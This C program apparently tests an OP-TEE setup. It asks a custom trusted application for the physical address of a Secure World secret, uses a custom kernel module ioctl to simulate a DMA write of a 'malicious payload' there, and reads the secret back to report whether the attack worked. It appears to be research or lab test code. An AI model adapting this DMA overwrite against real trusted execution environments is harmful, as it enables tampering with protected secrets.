#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <tee_client_api.h>
#include <my_ta.h>

#define SECRET_SIZE        32
#define MALICIOUS_DATA_LEN 16

// Kernel Module IOCTL Definitions (must match my_kmod.c)
#define DEVICE_FILE    "/dev/my_kmod"
#define MY_KMOD_MAGIC  'k'
#define DMA_WRITE_PHYS _IOW(MY_KMOD_MAGIC, 1, struct dma_transfer_args)

// Structure must match kernel module
struct dma_transfer_args {
    uint64_t pa;
    size_t   len;
    void    *data;
};

// =================================================================
// 2. Helper Functions
// =================================================================

static void print_data(const char *label, uint8_t *data, size_t len)
{
    printf("%s (Size %zu): ", label, len);
    for (size_t i = 0; i < len; i++) {
        printf("%02X", data[i]);
        if (i < len - 1)
            printf(" ");
    }
    printf("\n");
}

static TEEC_Result read_secret(TEEC_Session *sess, uint8_t *buffer, size_t *size)
{
    TEEC_Operation op;
    uint32_t origin;
    TEEC_Result res;

    memset(&op, 0, sizeof(op));

    op.paramTypes =
        TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_OUTPUT,
                         TEEC_NONE, TEEC_NONE, TEEC_NONE);

    op.params[0].tmpref.buffer = buffer;
    op.params[0].tmpref.size   = SECRET_SIZE;

    res = TEEC_InvokeCommand(sess, CMD_GET_SECRET, &op, &origin);
    if (res != TEEC_SUCCESS) {
        fprintf(stderr, "[-] CMD_GET_SECRET failed: 0x%x (origin 0x%x)\n",
                res, origin);
        return res;
    }

    *size = op.params[0].tmpref.size;
    return TEEC_SUCCESS;
}

static int dma_write_phys(uint64_t pa, uint8_t *data, size_t len)
{
    int fd;
    struct dma_transfer_args args;
    int ret;

    printf("[ ] Opening Kernel Module device: %s\n", DEVICE_FILE);
    fd = open(DEVICE_FILE, O_WRONLY);
    if (fd < 0) {
        perror("[-] Failed to open device file. Ensure my_kmod is loaded");
        return -1;
    }

    args.pa   = pa;
    args.len  = len;
    args.data = data;

    printf("[ ] Invoking IOCTL to simulate DMA write of %zu bytes to PA 0x%016llX...\n",
           len, (unsigned long long)pa);
    print_data("    Malicious Payload", data, len);

    ret = ioctl(fd, DMA_WRITE_PHYS, &args);
    close(fd);

    if (ret < 0) {
        perror("[-] IOCTL (DMA_WRITE_PHYS) failed");
        return -1;
    }

    printf("[+] DMA write simulation command sent successfully.\n");
    return 0;
}

// =================================================================
// 3. Main Program
// =================================================================

int main(void)
{
    TEEC_Context ctx;
    TEEC_Session sess;
    TEEC_Operation op;
    TEEC_Result res;
    uint32_t err_origin;
    uint64_t secret_pa = 0;
    uint8_t current_secret[SECRET_SIZE];
    size_t current_secret_size = 0;
    int ret = 0;

    uint8_t malicious_data[MALICIOUS_DATA_LEN] = {
        0xAA, 0xB1, 0xC3, 0xD4,
        0xEE, 0xFF, 0x00, 0x11,
        0x22, 0x53, 0x44, 0x55,
        0x66, 0x77, 0x88, 0x11
    };

    res = TEEC_InitializeContext(NULL, &ctx);
    if (res != TEEC_SUCCESS) {
        printf("[-] TEEC_InitializeContext failed: 0x%x\n", res);
        return 1;
    }

    TEEC_UUID uuid = MY_TA_UUID;
    res = TEEC_OpenSession(&ctx, &sess, &uuid,
                           TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("[-] TEEC_OpenSession failed: 0x%x (origin 0x%x)\n",
               res, err_origin);
        ret = 1;
        goto cleanup_1;
    }

    // =================================================================
    // Step 1: Request g_secret PA from TA
    // =================================================================
    printf("\n--- Step 1: Requesting physical address (PA) from TA ---\n");
    memset(&op, 0, sizeof(op));

    op.paramTypes =
        TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_OUTPUT,
                         TEEC_NONE, TEEC_NONE, TEEC_NONE);

    op.params[0].tmpref.buffer = &secret_pa;
    op.params[0].tmpref.size   = sizeof(secret_pa);

    res = TEEC_InvokeCommand(&sess, CMD_GET_PA, &op, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("[-] CMD_GET_PA invocation failed: 0x%x (origin 0x%x)\n",
               res, err_origin);
        ret = 1;
        goto cleanup_2;
    }

    if (op.params[0].tmpref.size != sizeof(secret_pa)) {
        printf("[-] CMD_GET_PA returned unexpected size %zu (expected %zu)\n",
               op.params[0].tmpref.size, sizeof(secret_pa));
        ret = 1;
        goto cleanup_2;
    }

    printf("[+] TA returned g_secret PA = 0x%016llX\n", (unsigned long long)secret_pa);

    if (secret_pa == 0) {
        printf("[-] Error: PA is 0. Cannot perform DMA test.\n");
        ret = 1;
        goto cleanup_2;
    }

    // =================================================================
    // Step 2: Perform DMA Write Attack
    // =================================================================
    printf("\n--- Step 2: Executing DMA Write Simulation ---\n");
    if (dma_write_phys(secret_pa, malicious_data, MALICIOUS_DATA_LEN) != 0) {
        printf("[-] DMA write failed or error occurred. Aborting test.\n");
        ret = 1;
        goto cleanup_2;
    }

    // =================================================================
    // Step 3: Read back secret from TA to confirm overwrite
    // =================================================================
    printf("\n--- Step 3: Reading secret data (post-DMA) ---\n");
    if (read_secret(&sess, current_secret, &current_secret_size) != TEEC_SUCCESS) {
        ret = 1;
        goto cleanup_2;
    }
    print_data("[!] Secret content after DMA", current_secret, current_secret_size);

    if (memcmp(current_secret, malicious_data, MALICIOUS_DATA_LEN) == 0) {
        printf("\n========================================================\n");
        printf(">>> RESULT: DMA Attack SUCCESS <<<\n");
        printf("The first %d bytes of Secure World g_secret were overwritten.\n",
               MALICIOUS_DATA_LEN);
        printf("========================================================\n");
        ret = 0;
    } else {
        printf("\n========================================================\n");
        printf(">>> RESULT: DMA Attack FAILED <<<\n");
        printf("The first %d bytes of g_secret do not match the malicious payload.\n",
               MALICIOUS_DATA_LEN);
        printf("Possible reasons: cache not synchronized or additional protections.\n");
        printf("========================================================\n");
        ret = 0;
    }

cleanup_2:
    TEEC_CloseSession(&sess);
cleanup_1:
    TEEC_FinalizeContext(&ctx);
    return ret;
}
